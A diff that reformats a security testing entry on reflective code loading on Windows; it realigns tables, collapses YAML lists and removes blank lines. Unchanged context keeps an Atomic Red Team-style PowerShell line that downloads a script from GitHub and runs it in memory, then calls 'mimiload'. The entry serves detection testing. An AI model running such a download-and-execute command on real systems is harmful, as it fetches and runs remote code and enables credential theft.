@@ -27,10 +27,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-693
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -75,7 +73,6 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 mimiload -consoleoutput -noninteractive
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -94,19 +91,17 @@ No specific mitigations documented for this technique.
 
 ### Detection Strategy for Reflective Code Loading
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Reflective Code Loading technique applicable | High | Defense Evasion |
+| Finding                                      | Severity | Impact          |
+| -------------------------------------------- | -------- | --------------- |
+| Reflective Code Loading technique applicable | High     | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
